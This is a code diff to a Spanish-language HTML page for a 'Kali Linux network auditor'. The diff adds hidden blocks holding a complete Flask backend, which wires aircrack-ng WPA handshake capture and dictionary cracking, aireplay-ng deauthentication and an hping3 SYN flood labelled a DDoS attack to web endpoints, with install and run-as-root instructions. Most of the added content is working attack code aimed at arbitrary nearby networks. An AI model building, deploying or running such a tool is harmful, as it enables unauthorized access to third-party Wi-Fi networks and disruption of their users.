@@ -2,14 +2,8 @@
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
 <title>Auditor de Redes Kali Linux con Backend Python</title>
-
-  <!-- Enlace a Google Fonts -->
 <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
-
-
-  <!-- Estilos CSS personalizados -->
 <style>
-/* Variables de color */
 :root {
   --bg-dark: #0a0a0a;
   --text-light: #e0e0e0;
@@ -18,7 +12,6 @@
   --gradient: linear-gradient(45deg, #00ff9d, #00b8ff);
 }
 
-/* Estilos del body */
 body {
   background: var(--bg-dark);
   color: var(--text-light);
@@ -28,13 +21,11 @@ body {
   line-height: 1.6;
 }
 
-/* Contenedor principal */
 .container {
   max-width: 1000px;
   margin: 0 auto;
 }
 
-/* Estilos para el título principal */
 h1 {
   background: var(--gradient);
   -webkit-background-clip: text;
@@ -47,7 +38,6 @@ h1 {
   letter-spacing: 2px;
 }
 
-/* Estilos para el terminal */
 .terminal {
   background: rgba(0, 0, 0, 0.8);
   border: 1px solid var(--accent);
@@ -66,7 +56,6 @@ h1 {
   white-space: pre-wrap;
 }
 
-/* Estilos para el botón */
 .button-group {
   display: flex;
   gap: 15px;
@@ -97,7 +86,6 @@ button:hover {
   box-shadow: 0 5px 15px rgba(0, 255, 157, 0.2);
 }
 
-/* Estilos para el select */
 select {
   background: rgba(0, 0, 0, 0.8);
   border: 2px solid var(--accent);
@@ -121,7 +109,6 @@ select option {
   padding: 10px;
 }
 
-/* Estilos para el listado de redes */
 .network-list {
   display: grid;
   grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
@@ -129,7 +116,6 @@ select option {
   padding: 20px;
 }
 
-/* Estilos para el item de red */
 .network-item {
   background: rgba(0, 0, 0, 0.6);
   border: 1px solid var(--accent);
@@ -143,7 +129,6 @@ select option {
   gap: 10px;
 }
 
-/* Estilos para el icono de red */
 .network-item:hover {
   transform: translateY(-5px);
   box-shadow: 0 10px 20px rgba(0, 255, 157, 0.2);
@@ -178,7 +163,6 @@ select option {
   color: var(--accent);
 }
 
-/* Estilos para el botón del item de red */
 .network-item .button-group {
   margin-top: 15px;
   opacity: 1;
@@ -186,7 +170,6 @@ select option {
   justify-content: flex-start;
 }
 
-/* Estilos para el icono de red */
 .network-item .button-group button {
   padding: 8px 16px;
   font-size: 0.8em;
@@ -237,7 +220,7 @@ select option {
   background: #00b8ff;
 }
 
-/* Añadir efectos */
+/* Add hover effect to network items */
 .network-item .button-group {
   opacity: 0;
   transform: translateY(10px);
@@ -249,7 +232,7 @@ select option {
   transform: translateY(0);
 }
 
-/* Añadir efecto glow */
+/* Add subtle glow effect to terminal */
 .terminal::before {
   content: '';
   position: absolute;
@@ -264,7 +247,7 @@ select option {
   filter: blur(20px);
 }
 
-/* style animacion de escaneo */
+/* Scan animation styles */
 .scan-animation {
   display: flex;
   align-items: center;
@@ -380,7 +363,6 @@ class NetworkAuditor {
     this.log(result.message);
   }
 
-  // Función para obtener interfaces inalámbricas
   async getInterfaces() {
     this.log('Getting network interfaces...');
     try {
@@ -399,7 +381,6 @@ class NetworkAuditor {
     }
   }
 
-  // Funcion para Habilitar el interface en modo monitor
   async enableMonitorMode() {
     if (!this.currentInterface) {
       this.log('Please select an interface first');
@@ -420,7 +401,6 @@ class NetworkAuditor {
     }
   }
 
-  // Funcion para Desactivar el Modo monitor 
   async disableMonitorMode() {
     if (!this.currentInterface) {
       this.log('Please select an interface first');
@@ -440,7 +420,6 @@ class NetworkAuditor {
     }
   }
 
-  // Funcion para Escanearlas redes
   async scanNetworks() {
     if (!this.currentInterface) {
       this.log('Please select an interface first');
@@ -449,7 +428,7 @@ class NetworkAuditor {
 
     this.log('Scanning for networks...');
     
-    // Limpiar redes existentes y mostrar animacion
+    // Clear existing networks and show animation
     this.networkList.innerHTML = `
       <div class="scan-animation">
         <div class="scan-wave"></div>
@@ -465,7 +444,7 @@ class NetworkAuditor {
         body: JSON.stringify({interface: this.currentInterface})
       });
       
-      // delay para la animacion
+      // Add a minimum delay to show the animation
       await new Promise(resolve => setTimeout(resolve, 2000));
       
       this.networks = await response.json();
@@ -486,7 +465,6 @@ class NetworkAuditor {
     this.log('Terminal limpiada');
   }
 
-  // Funcion para capturar el handshake de una red
   async captureHandshake(network) {
     if (!this.currentInterface) {
       this.log('Please select an interface first');
@@ -511,7 +489,6 @@ class NetworkAuditor {
     }
   }
 
-  // Funcion para Desautenticar una red
   async deauthNetwork(network) {
     if (!this.currentInterface) {
       this.log('Please select an interface first');
@@ -535,7 +512,6 @@ class NetworkAuditor {
     }
   }
 
-  // Funcion para Realizar un ataque DDoS
   async ddosNetwork(network) {
     if (!this.currentInterface) {
       this.log('Por favor seleccione una interfaz primero');
@@ -632,34 +608,275 @@ function updateSelectedInterface() {
   }
 }
 
-// Funcion para obtener todas las interfaces inalambricas
 function getInterfaces() {
   auditor.getInterfaces();
 }
 
-// Funcion para activar ek modo monitor de la interfaz seleccionada
 function enableMonitorMode() {
   auditor.enableMonitorMode();
 }
 
-// Función para desactivar el modo monitor en la interfaz seleccionada
 function disableMonitorMode() {
   auditor.disableMonitorMode();
 }
 
-// Función para restaurar la interfaz a su estado original
 function restoreInterface() {
   auditor.disableMonitorMode();
 }
 
-// Función para escanear las redes en la interfaz seleccionada
 function scanNetworks() {
   auditor.scanNetworks();
 }
 </script>
 
 <pre style="display: none;">
+# network_utils.py
+import subprocess
+
+def get_wireless_interfaces():
+    """Get all wireless network interfaces"""
+    try:
+        cmd = "iwconfig"
+        output = subprocess.check_output(cmd.split(), stderr=subprocess.STDOUT).decode()
+        interfaces = []
+        for line in output.split('\n'):
+            if 'IEEE 802.11' in line:
+                iface = line.split()[0]
+                interfaces.append({'name': iface, 'type': 'IEEE 802.11'})
+        return interfaces
+    except Exception as e:
+        raise Exception(f"Error getting interfaces: {str(e)}")
+
+def set_monitor_mode(interface, enable=True):
+    """Enable or disable monitor mode for a given interface"""
+    try:
+        cmd = f"airmon-ng {'start' if enable else 'stop'} {interface}"
+        output = subprocess.check_output(cmd.split(), stderr=subprocess.STDOUT).decode()
+        return output
+    except Exception as e:
+        raise Exception(f"Error setting monitor mode: {str(e)}")
+
+def scan_wifi_networks(interface):
+    """Scan for available WiFi networks"""
+    try:
+        cmd = f"airodump-ng {interface} --output-format csv --write /tmp/scan"
+        process = subprocess.Popen(cmd.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        import time
+        time.sleep(10)  # Scan for 10 seconds
+        process.terminate()
+        
+        networks = []
+        with open('/tmp/scan-01.csv', 'r') as f:
+            lines = f.readlines()
+            for line in lines[2:]:  # Skip header lines
+                if line.strip():
+                    parts = line.split(',')
+                    if len(parts) > 13:
+                        networks.append({
+                            'bssid': parts[0].strip(),
+                            'channel': parts[3].strip(),
+                            'frequency': parts[4].strip(),
+                            'ssid': parts[13].strip()
+                        })
+        
+        import os
+        os.remove('/tmp/scan-01.csv')
+        return networks
+    except Exception as e:
+        raise Exception(f"Error scanning networks: {str(e)}")
 </pre>
+
+<pre style="display: none;">
+# attack_utils.py
+import subprocess
+import time
+import os
+import glob
+
+def capture_handshake(interface, bssid, channel):
+    """Capture WPA handshake for a specific network"""
+    try:
+        capture_file = f"/tmp/capture-{bssid.replace(':', '')}"
+        cmd = f"airodump-ng --bssid {bssid} -c {channel} -w {capture_file} {interface}"
+        process = subprocess.Popen(cmd.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        
+        time.sleep(30)  # Capture for 30 seconds
+        process.terminate()
+        
+        # Attempt to crack the captured handshake
+        cap_file = f"{capture_file}-01.cap"
+        cmd = f"aircrack-ng {cap_file} -w /usr/share/wordlists/rockyou.txt"
+        output = subprocess.check_output(cmd.split(), stderr=subprocess.STDOUT).decode()
+        
+        # Clean up capture files
+        for f in glob.glob(f"{capture_file}*"):
+            os.remove(f)
+            
+        return output
+    except Exception as e:
+        raise Exception(f"Error al capturar handshake: {str(e)}")
+
+def deauth_attack(interface, bssid):
+    """Perform deauth attack on a specific network"""
+    try:
+        cmd = f"aireplay-ng --deauth 10 -a {bssid} {interface}"
+        output = subprocess.check_output(cmd.split(), stderr=subprocess.STDOUT).decode()
+        return output
+    except Exception as e:
+        raise Exception(f"Error performing deauth attack: {str(e)}")
+
+def ddos_attack(interface, bssid, packets=1000):
+    """Perform DDoS attack on a specific network"""
+    try:
+        cmd = f"hping3 -c {packets} -d 120 -S -w 64 -p 80 --flood --rand-source {bssid}"
+        process = subprocess.Popen(cmd.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        time.sleep(10)  # Run for 10 seconds
+        process.terminate()
+        return "Ataque DDoS completado"
+    except Exception as e:
+        raise Exception(f"Error durante el ataque DDoS: {str(e)}")
+</pre>
+
+<pre style="display: none;">
+# app.py
+from flask import Flask, jsonify, request
+from network_utils import get_wireless_interfaces, set_monitor_mode, scan_wifi_networks
+from attack_utils import capture_handshake, deauth_attack, ddos_attack
+
+app = Flask(__name__)
+
+@app.route('/api/get_interfaces')
+def get_interfaces():
+    """API endpoint to get wireless interfaces"""
+    try:
+        interfaces = get_wireless_interfaces()
+        return jsonify(interfaces)
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/api/enable_monitor', methods=['POST'])
+def enable_monitor():
+    """API endpoint to enable monitor mode"""
+    try:
+        data = request.json
+        interface = data['interface']
+        output = set_monitor_mode(interface, enable=True)
+        return jsonify({'message': f'Modo monitor activado en {interface}\n{output}'})
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/api/disable_monitor', methods=['POST'])
+def disable_monitor():
+    """API endpoint to disable monitor mode"""
+    try:
+        data = request.json
+        interface = data['interface']
+        output = set_monitor_mode(interface, enable=False)
+        return jsonify({'message': f'Modo monitor desactivado en {interface}\n{output}'})
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/api/scan_networks', methods=['POST'])
+def scan_networks():
+    """API endpoint to scan for WiFi networks"""
+    try:
+        data = request.json
+        interface = data['interface']
+        networks = scan_wifi_networks(interface)
+        return jsonify(networks)
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/api/capture_handshake', methods=['POST'])
+def capture_handshake_route():
+    """API endpoint to capture WPA handshake"""
+    try:
+        data = request.json
+        output = capture_handshake(
+            data['interface'],
+            data['bssid'],
+            data['channel']
+        )
+        return jsonify({'message': f'Captura completada. Resultados:\n{output}'})
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/api/deauth_network', methods=['POST'])
+def deauth_network():
+    """API endpoint to perform deauth attack"""
+    try:
+        data = request.json
+        output = deauth_attack(data['interface'], data['bssid'])
+        return jsonify({'message': f'Ataque de desautenticación completado\n{output}'})
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/api/ddos_attack', methods=['POST'])
+def ddos_network():
+    """API endpoint to perform DDoS attack"""
+    try:
+        data = request.json
+        output = ddos_attack(data['interface'], data['bssid'])
+        return jsonify({'message': f'Ataque DDoS completado\n{output}'})
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=5000)
+</pre>
+
+<pre style="display: none;">
+# Save the Python code as app.py
+# Install required dependencies:
+pip install flask
+
+# Run the Flask application:
+python app.py
+
+# Make sure you have the following Kali Linux tools installed:
+# - aircrack-ng
+# - airodump-ng
+# - aireplay-ng
+# - iwconfig
+# - hping3
+
+# Note: This application requires root privileges to run properly
+# Run with: sudo python app.py
+</pre>
+
+<h2>Requisitos Previos</h2>
+<ul>
+  <li>Sistema Operativo Kali Linux</li>
+  <li>Python 3.x</li>
+  <li>Paquetes necesarios:
+    <ul>
+      <li>Flask</li>
+      <li>Suite aircrack-ng</li>
+      <li>hping3 (para ataques DDoS)</li>
+    </ul>
+  </li>
+</ul>
+
+<h2>Instalación</h2>
+<ol>
+  <li>Instalar paquetes Python requeridos:</li>
+  <pre>pip install flask</pre>
+  <li>Instalar herramientas de Kali Linux necesarias:</li>
+  <pre>
+# Instalar suite aircrack-ng y hping3
+sudo apt install aircrack-ng hping3
+</pre>
+</ol>
+
+<h2>Uso</h2>
+<ol>
+  <li>Clonar el repositorio</li>
+  <li>Navegar al directorio del proyecto</li>
+  <li>Ejecutar la aplicación con privilegios de root:</li>
+  <pre>sudo python app.py</pre>
+  <li>Abrir un navegador web y navegar a:</li>
+  <pre>http://localhost:5000</pre>
+</ol>
 
 <h2>Características</h2>
 <ul>
@@ -692,8 +909,8 @@ function scanNetworks() {
     <li>Verifica que airodump-ng esté capturando paquetes
       <pre>sudo airodump-ng [interface] --bssid [target_bssid] -c [channel] -w capture</pre>
     </li>
-    <li>Asegúrate que el diccionario rockyou.txt esté presente en la carpeta Downloads y extraído en Dowloads
-      <pre>sudo gunzip /home/kali/Downloads/rockyou.txt.gz</pre>
+    <li>Asegúrate que el diccionario rockyou.txt esté presente y extraído
+      <pre>sudo gunzip /usr/share/wordlists/rockyou.txt.gz</pre>
     </li>
   </ol>
   
